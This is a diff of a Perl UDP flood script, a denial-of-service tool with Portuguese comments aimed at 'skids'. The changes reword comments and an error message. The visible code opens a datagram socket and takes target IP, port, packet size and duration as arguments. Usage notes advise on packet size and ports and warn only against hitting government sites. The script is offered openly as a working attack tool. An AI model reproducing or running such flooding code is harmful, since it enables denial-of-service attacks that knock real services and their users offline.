@@ -1,9 +1,9 @@
 #!/usr/bin/perl
 
-#Sei lá - Por favor, não derrube sites do governo, ai já é sua responsabilidade e bom senso.
+#Para SKIDS - Por favor, não derrube sites do governo, ai já é sua responsabilidade e bom senso.
 #Port - Port '80' para HTTPS (Comum para lammer) ou '53' para DNS ou '443' para HTTPS [SOURCE: INTERNET / ALL RIGHTS TO CREATOR]
 #Size - Não use mais de 1500+ Pacotes
-#Time - Olha, dependendo da sua conexão, ela pode cair :O 
+#CONEXÃO - Tomara q ela seja boa
 #CANCELAR = CTRL + C
  
 use Socket;
@@ -24,7 +24,7 @@ if ($#ARGV != 3) {
 
 my ($ip,$port,$size,$time) = @ARGV;
 my ($iaddr,$endtime,$psize,$pport);
-$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
+$iaddr = inet_aton("$ip") or die "Não consigo conectar ao IP $ip\n";
 $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 print "~Para cancelar, aperte \'Ctrl-C\'\n\n";
